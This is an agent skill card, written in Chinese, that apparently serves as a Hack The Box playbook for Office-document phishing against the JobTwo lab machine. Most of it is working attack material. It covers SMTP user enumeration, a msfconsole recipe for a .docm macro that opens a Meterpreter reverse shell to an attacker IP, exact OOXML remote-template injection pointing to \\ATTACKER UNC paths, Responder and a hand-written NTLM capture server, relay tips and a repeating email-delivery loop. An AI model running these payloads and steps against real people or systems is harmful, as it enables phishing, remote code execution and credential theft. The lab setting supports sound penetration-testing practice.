---
name: 'office-document-phishing-payloads'
description: '题面/站点明说"把你的 Word 文档发到某邮箱"、靶机开 25、或有用户模拟器会自动打开附件时加载：office document 钓鱼 payload 的选型与投放 —— 先判 docm 宏再判 docx 远程模板，附精确 OOXML、UNC 形态规律、NTLM 捕获基础设施、邮件机器人卡死与恢复。(检索词：office/office-document/document/phishing/phish/email phishing/payload/payloads/docx/docm/word/macro/macros/remote template/remote-template/attachedTemplate/attached template/OOXML/WebDAV/UNC/net-ntlm/net ntlm/NetNTLMv2/Responder/Protected View/protected-view/MOTW/mark of the web/邮件钓鱼/钓鱼/简历/宏文档/宏/远程模板/附件/用户模拟器)'
whenToUse: '站点或题面明确要求"把某个 Office 文档发给某人/某邮箱"，或靶机运行邮件服务且存在会自动打开附件的模拟用户时'
metadata: { domain: web, tier: T2 }
---

# Office 文档钓鱼 payload：选型、投放与捕获

> ⚠️ **一手实测卡**（HTB JobTwo, Windows Server 2022 + hMailServer, 2026-09-30），**非 WP 语料回灌**。
> 所有"实测"二字后面的结论都来自本次真机；标 🔷 的是未经本人复现的推论。

## 触发信号

- 站点正文出现这类句子：`please send your CV to hr@<domain> as a Microsoft Word Document`
- `nmap` 开 **25/tcp**（hMailServer / 其它 MTA），且几乎只有 25（110/143/993/995 常常关着）
- `RCPT TO:<hr@domain>` → `250 OK`，`RCPT TO:<nobody@domain>` → `550 Unknown user`（可枚举用户）
- 靶机是 Windows 且装了 Office（Word 会以 `Microsoft Office Word 2014` / `Microsoft Office Word` 的 UA 出现在你的监听日志里）
- 你投的邮件被收下（`250 Queued`）后，**几十秒到几十分钟内**靶机主动连你的 80 / 445

## 前置验证

```bash
# 1) 邮件用户枚举（hMailServer 默认不限速：一条连接可以发无限多个 RCPT）
python3 - <<'PY'
import socket, time
s = socket.create_connection(('TARGET', 25), 10); s.settimeout(8); s.recv(4096)
s.sendall(b'EHLO a.local\r\n'); time.sleep(.3); s.recv(4096)
s.sendall(b'MAIL FROM:<a@a.local>\r\n'); time.sleep(.3); s.recv(4096)
for u in ['hr','admin','info','jobs','it']:
    s.sendall(f'RCPT TO:<{u}@DOMAIN>\r\n'.encode()); time.sleep(.25)
    print(u, s.recv(4096).decode(errors='replace').strip())
PY

# 2) 确认能投递（无需认证）
swaks --to hr@DOMAIN --from x@external.tld --server TARGET --header "Subject: test" --body test
```

```bash
# 3) 先起监听，再投递 —— 顺序反了会白丢一次窗口
sudo responder -I tun0 -v          # SMB / LLMNR / NBT-NS
python3 -u ntlm_http.py 80         # 自建 HTTP NTLM 捕获（见模式 4）
```

## 模式 1: 🔴 先判「宏」还是「远程模板」—— 宏优先

**这是本卡最重要的一条实测结论**：同一台机器上，`.docm` 宏能直接给 shell，而 `.docx` 远程模板只能换到 NetNTLMv2。

| payload | 靶机行为 | 你拿到什么 |
|---|---|---|
| `.docx` + 远程模板（WebDAV / SMB UNC） | Word 去取外部模板 → 对你做一次 NTLM 认证 | **NetNTLMv2**（要破或中继，见下） |
| **`.docm` + AutoOpen 宏** | Word 打开文档时**静默执行宏** | 🎯 **直接反弹 shell** |

**为什么宏会静默执行**：脚本/COM 自动化打开文档时，`Application.AutomationSecurity` 的默认值是 `msoAutomationSecurityLow`，
即"不弹启用内容提示"。HTB 的邮件机器人正是这种自动化打开 ⇒ 宏直接跑。
（🔷 若机器人改用"另存到磁盘再由真人点开"，则会受 Office 的 internet-macros-blocked 策略阻挡。）

⇒ **顺序建议：先投 `.docm` 宏（成本低、上限高），宏不行再退回远程模板拿 NTLM。**

### HTB 案例
| 机器 | 细节 |
|------|------|
| JobTwo | `hr@job2.vl` 收 `.docm` → Word 自动化执行 AutoOpen → Meterpreter `JOB2\Julian` |

## 模式 2: `.docx` 远程模板注入（精确到字节）

一个合法 docx 里加两部分即可；**`Target` 的形态决定靶机到底去不去取**。

```xml
<!-- word/settings.xml -->
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:attachedTemplate r:id="rIdRemoteTemplate"/>
</w:settings>
```

```xml
<!-- word/_rels/settings.xml.rels -->
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rIdRemoteTemplate"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="\\ATTACKER\t\t.dotm" TargetMode="External"/>
</Relationships>
```

- `Type` 串由 **MS-OE376 §2.15.1.6** 钉死，不在 ECMA-376 里，抄错就不生效
- `w:attachedTemplate` **不支持 `w:val`**，路径只能走 `r:id`
- `[Content_Types].xml` 要有 `/word/settings.xml` 的 Override（`...wordprocessingml.settings+xml`）
- 用 Python 的 python-docx 库生成底稿再改 zip（比手搓空包稳）

### 🔴 Target 形态规律（本次 5 个数据点实测）

| Target 形态 | Word 是否真去取 |
|---|---|
| `http://ATTACKER/t.dotm`（纯 HTTP URL） | ❌ **零请求** |
| `\\ATTACKER@80\DavWWWRoot\t.dotm`（WebDAV UNC） | ✅ 立刻发 `OPTIONS /` |
| `\\ATTACKER\t\t.dotm`（SMB UNC） | ✅ 立刻做 SMB NTLM 认证 |

⇒ **Office 2016 只对 `\\host@port\...` 形态的 UNC 去取，纯 `http://` 模板 URL 一律不触发。**
🔴 另外：往 docx 里额外塞 `webSettings` frameset 会让 Word **直接拒绝打开该文档**（表现为靶机零网络行为）。

### HTB 案例
| 机器 | 细节 |
|------|------|
| JobTwo | WebDAV UNC 与 SMB UNC 均触发；纯 http:// 三个变体全部零请求 |

## 模式 3: `.docm` 宏（推荐首选路径）

```bash
# 生成（自包含：payload 以 base64 藏进文档元数据注释，宏读取后经 WScript.Shell 执行）
msfconsole -q -x "use exploit/multi/fileformat/office_word_macro; \
  set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.48; set LPORT 4466; \
  set FILENAME CV.docm; exploit -j"
# 产物：/root/.msf4/local/CV.docm

# 投递（macroEnabled 类型）
swaks --to hr@DOMAIN --from a@b.tld --server TARGET \
  --header "Subject: CV - application" --body "Dear HR, CV attached." \
  --attach @/root/.msf4/local/CV.docm \
  --attach-type application/vnd.ms-word.document.macroEnabled.12
```

### 🔴 三个必踩的坑

1. **handler 必须单独起**。`exploit -j` 生成文件后 job 就结束了，**handler 随之消失**；
   靶机第一次回调会因为没人应答而只显示 SYN 重传，很容易被误判成"宏没执行"。
   ⇒ 先 `use multi/handler` + `set ExitOnSession false` + `exploit -j`，确认 `ss -lntp | grep <LPORT>` 有监听，再投递。
2. **x64 payload 不被该模块接受**：`windows/x64/meterpreter/reverse_tcp` → `is not a compatible payload`，用 `windows/meterpreter/reverse_tcp`。
3. **LPORT 冲突**：先确认端口没被占（靶场里常见遗留 `nc -lvnp`）。

### HTB 案例
| 机器 | 细节 |
|------|------|
| JobTwo | 首次回调 11:51 因 handler 缺失而丢掉；补上 handler 后 12:00 起连开 3+ session |

## 模式 4: NTLM 捕获基础设施

### SMB（最稳，但同机不可中继）
```bash
# 🔴 先检查 Responder.conf —— 上一轮会话可能把模块全关了
grep -E '^(SMB|SMB2|HTTP|HTTPS|QUIC)\s*=' /usr/share/responder/Responder.conf
sed -i 's/^SMB = Off/SMB = On/; s/^SMB2 = Off/SMB2 = On/; s/^QUIC     = On/QUIC     = Off/' \
  /usr/share/responder/Responder.conf
responder -I tun0 -v          # 哈希落在 /usr/share/responder/logs/SMB-NTLMv2-SSP-<ip>.txt
```
- 🔴 **`QUIC = On` 会让 Responder 直接崩**（`aioquic` 绑 UDP 443 冲突 → 线程异常退出）
- 🔴 **哈希不要去重成一条再破**：同一用户每条连接的 challenge 不同，多留几条

### HTTP / WebDAV（自建挑战服务器）
想让 Word 走 HTTP，需要满足两件事，缺一不可：
1. **服务端要发 401 挑战**（Office 会带 `X-IDCRL_OPTIONS: force-auth-challenge` 明示"请挑战我"；只回 200 它会探测几轮后放弃）
2. **URL 的主机必须在 Local intranet 区域** —— 用 **IP 是 Internet 区域，Word 不会自动发凭据**（只发一个空的 `Authorization: Bearer` 探测）
   ⇒ 必须用**单标签主机名**（如 `\\kali@80\DavWWWRoot\t.dotm`）并让它解析到你

🔴 **单标签主机名在 VPN 隧道上常常解析不了**：Windows 靠 **LLMNR/NBT-NS 组播**（224.0.0.252 / 广播）解析单标签名，而
**组播通常不过点对点 VPN 隧道** ⇒ Responder 收不到查询、也就答不了，整条 HTTP 路线静默失效。
判据：`grep -c 'name <你的主机名>' /usr/share/responder/logs/Responder-Session.log` 长期为 0。

自建一个只做 NTLM 的 WebDAV 服务器（不依赖 impacket，手写 Type2 即可）：

```python
def build_type2(challenge, target="JOB2"):
    FLAGS = 0xA0888205  # UNICODE|REQUEST_TARGET|NTLM|ALWAYS_SIGN|ESS|TARGET_INFO|128|56
    def av(i, v): return struct.pack("<HH", i, len(v)) + v
    ti  = av(1, target.encode("utf-16-le"))   # MsvAvNbComputerName
    ti += av(2, target.encode("utf-16-le"))   # MsvAvNbDomainName
    ti += av(3, target.encode("utf-16-le"))   # MsvAvDnsComputerName
    ti += av(4, target.encode("utf-16-le"))   # MsvAvDnsDomainName
    ti += av(5, target.encode("utf-16-le"))   # MsvAvDnsTreeName
    ti += av(7, struct.pack("<Q", int((time.time()+11644473600)*10_000_000)))  # MsvAvTimestamp
    ti += struct.pack("<HH", 0, 0)            # MsvAvEOL
    tn  = target.encode("utf-16-le")
    out  = b"NTLMSSP\x00" + struct.pack("<I", 2)
    out += struct.pack("<HHI", len(tn), len(tn), 48)
    out += struct.pack("<I", FLAGS) + challenge + b"\x00"*8
    out += struct.pack("<HHI", len(ti), len(ti), 48+len(tn))
    return out + tn + ti
```
- 🔴 **AV_PAIR 必须齐全**（尤其 `MsvAvTimestamp`）；只写 `MsvAvEOL` 时 impacket 的 `getNTLMSSPType3` 会报
  `'NoneType' object is not subscriptable` —— 本地用 impacket 的 `getNTLMSSPType1/Type3` 先自测一遍握手再上靶机
- 🔴 **`OPTIONS` 要不要 401**：实测**回 200 和回 401 两种情况 Word 都没升级到 NTLM**（区域限制才是主因）；别在这一步反复调参

### 拿到 NetNTLMv2 之后
| 方向 | 实测结论 |
|---|---|
| 爆破 | `hashcat -m 5600`；口令可能是随机的 ⇒ 见 `password-attacks` |
| **SMB→SMB 中继到同一台** | ❌ **失败**（`Authenticating ... FAILED`，Windows 视为本机回环自登录） |
| 加 `-remove-target` 绕回环 | ❌ **更糟**：该开关走 CVE-2019-1019 机器账户分支，用户账户会卡在 `Connecting to None NETLOGON service` |
| **HTTP→SMB 中继到同一台** | ✅ 理论上不受回环限制（但需先拿到 HTTP 认证，见上） |

## 模式 5: 邮件机器人（User Simulator）行为规律

| 观测 | 实测值 |
|---|---|
| 触发延迟 | 首封邮件后 **1 分钟 ~ 30 分钟**；周期约 10–30 分钟 |
| 🔴 关键限制 | **每次开机基本只打开有限几封**；第一封被打"坏"后，后续邮件**永不再打开** |
| 卡死条件 | 首封被打开时你回了"意外"响应（典型是 `OPTIONS` 拿 401 后无后续）⇒ Word 停住 |
| 判别方法 | `tcpdump -r cap.pcap -n 'src host TARGET and not port 25'`：**零出站 = 机器人已卡** |
| 🔴 唯一可靠修法 | **重置靶机**（IP 会变，注意同步 `/etc/hosts`、监听目标、投递脚本参数） |
| 最佳打法 | **重置 → 立刻（开机后第一封）投递已验证可用的 payload**；别指望后续补投 |

```bash
# 持续投递循环（每 ~2.5 min 一封），用来等它的开窗
while :; do
  swaks --to hr@DOMAIN --from "a$RANDOM@b.tld" --server TARGET \
    --header "Subject: CV" --body "cv attached" \
    --attach @/root/cv.docm --attach-type application/vnd.ms-word.document.macroEnabled.12 --timeout 45
  sleep 150
done
```

## 快速检查清单

```bash
[ ] 站点/题面是否明确要求投递 Office 文档？（这是最硬的入口提示）
[ ] SMTP 用户枚举：RCPT TO 250 vs 550，找出收件人
[ ] 监听先起：Responder(SMB) + HTTP 捕获（顺序反了白丢窗口）
[ ] Responder.conf 模块是否被上一轮关掉？QUIC 是否 = Off？
[ ] 先投 .docm 宏；handler 是否已单独起且 ss 有监听？
[ ] 宏不通再投 .docx 远程模板，Target 用 `\\HOST\share\x.dotm` 或 `\\HOST@80\DavWWWRoot\x.dotm`
[ ] 零回调时先 tcpdump 判"机器人卡死"还是"payload 形态不对"，卡死就重置
[ ] 拿到哈希后别急着爆破：先算清候选量（见 password-attacks）
```

## 教训

1. 🔴 **别默认"远程模板 = 标准答案"**。远程模板的天花板只是 NetNTLMv2；同一台机器上 `.docm` 宏能直接给 shell。
   本次先花了两小时在中继/爆破上打转，换成宏 3 分钟出 session。
2. 🔴 **`filtered` / "没看到请求" 要先分清是"payload 形态不对"还是"消费方没运行"**：
   先用一个**已知能触发**的形态（SMB UNC）建立基线，再改一个变量。
3. 🔴 **每一个外部依赖都要有独立探测**：handler 是否真在监听、LLMNR 是否真被应答（发一条查询自测）、
   Responder 模块是否真开着 —— 这三样本次各坑了一次。
4. ⏱ **投递是"窗口型"操作**：先备好监听、再发邮件；重置后立刻投第一封。

## 相关卡

- `scf-ntlm-theft` —— 目标不是 Office 文档而是共享目录里的 .scf/.lnk/.url 时的 NTLM 窃取
- `ntlm-relay-chain` —— 拿到哈希后要做中继（含跨协议、签名、通道选择）
- `password-attacks` —— NetNTLMv2 的破解策略与候选量估算
- `hmailserver-attacks` —— 收件端是 hMailServer 时的枚举/配置/凭据面
- `htb-machine-reset-recovery` —— 机器人卡死后重置靶机的 API 与副作用
- `windows-privesc` —— 拿到 shell 之后的下一步
